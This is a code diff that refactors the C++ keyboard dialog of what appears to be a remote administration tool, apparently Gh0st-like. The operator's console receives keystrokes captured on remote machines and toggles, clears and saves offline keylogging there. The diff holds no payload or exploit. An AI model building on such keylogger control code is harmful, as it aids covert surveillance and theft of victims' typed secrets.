@@ -20,22 +20,9 @@ static char THIS_FILE[] = __FILE__;
 
 
 CKeyBoardDlg::CKeyBoardDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
-    : CDialog(CKeyBoardDlg::IDD, pParent)
+    : DialogBase(CKeyBoardDlg::IDD, pParent, pIOCPServer, pContext, IDI_KEYBOARD)
 {
-    //{{AFX_DATA_INIT(CKeyBoardDlg)
-    // NOTE: the ClassWizard will add member initialization here
-    //}}AFX_DATA_INIT
-    m_iocpServer	= pIOCPServer;
-    m_pContext		= pContext;
-    m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_KEYBOARD));
-
-    sockaddr_in  sockAddr;
-    memset(&sockAddr, 0, sizeof(sockAddr));
-    int nSockAddrLen = sizeof(sockAddr);
-    BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
-    m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
-
-    m_bIsOfflineRecord = (BYTE)m_pContext->m_DeCompressionBuffer.GetBuffer(0)[1];
+    m_bIsOfflineRecord = (BYTE)m_ContextObject->m_DeCompressionBuffer.GetBuffer(0)[1];
 }
 
 
@@ -91,7 +78,7 @@ BOOL CKeyBoardDlg::OnInitDialog()
 
     // 通知远程控制端对话框已经打开
     BYTE bToken = COMMAND_NEXT;
-    m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
+    m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
 
     return TRUE;  // return TRUE unless you set the focus to a control
     // EXCEPTION: OCX Property Pages should return FALSE
@@ -111,7 +98,7 @@ void CKeyBoardDlg::UpdateTitle()
 
 void CKeyBoardDlg::OnReceiveComplete()
 {
-    switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0]) {
+    switch (m_ContextObject->m_DeCompressionBuffer.GetBuffer(0)[0]) {
     case TOKEN_KEYBOARD_DATA:
         AddKeyBoardData();
         break;
@@ -123,10 +110,10 @@ void CKeyBoardDlg::OnReceiveComplete()
 void CKeyBoardDlg::AddKeyBoardData()
 {
     // 最后填上0
-    m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
+    m_ContextObject->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
     int	len = m_edit.GetWindowTextLength();
     m_edit.SetSel(len, len);
-    m_edit.ReplaceSel((TCHAR *)m_pContext->m_DeCompressionBuffer.GetBuffer(1));
+    m_edit.ReplaceSel((TCHAR *)m_ContextObject->m_DeCompressionBuffer.GetBuffer(1));
 }
 
 bool CKeyBoardDlg::SaveRecord()
@@ -157,7 +144,7 @@ void CKeyBoardDlg::OnSysCommand(UINT nID, LPARAM lParam)
         if (pSysMenu != NULL) {
             m_bIsOfflineRecord = !m_bIsOfflineRecord;
             BYTE bToken[] = { COMMAND_KEYBOARD_OFFLINE, m_bIsOfflineRecord };
-            m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
+            m_iocpServer->Send(m_ContextObject, bToken, sizeof(bToken));
             if (m_bIsOfflineRecord)
                 pSysMenu->CheckMenuItem(IDM_ENABLE_OFFLINE, MF_CHECKED);
             else
@@ -167,7 +154,7 @@ void CKeyBoardDlg::OnSysCommand(UINT nID, LPARAM lParam)
 
     } else if (nID == IDM_CLEAR_RECORD) {
         BYTE bToken = COMMAND_KEYBOARD_CLEAR;
-        m_iocpServer->Send(m_pContext, &bToken, 1);
+        m_iocpServer->Send(m_ContextObject, &bToken, 1);
         m_edit.SetWindowText("");
     } else if (nID == IDM_SAVE_RECORD) {
         SaveRecord();
@@ -208,8 +195,7 @@ BOOL CKeyBoardDlg::PreTranslateMessage(MSG* pMsg)
 
 void CKeyBoardDlg::OnClose()
 {
-    // TODO: Add your message handler code here and/or call default
-    closesocket(m_pContext->m_Socket);
+    CancelIO();
 
-    CDialog::OnClose();
+    DialogBase::OnClose();
 }
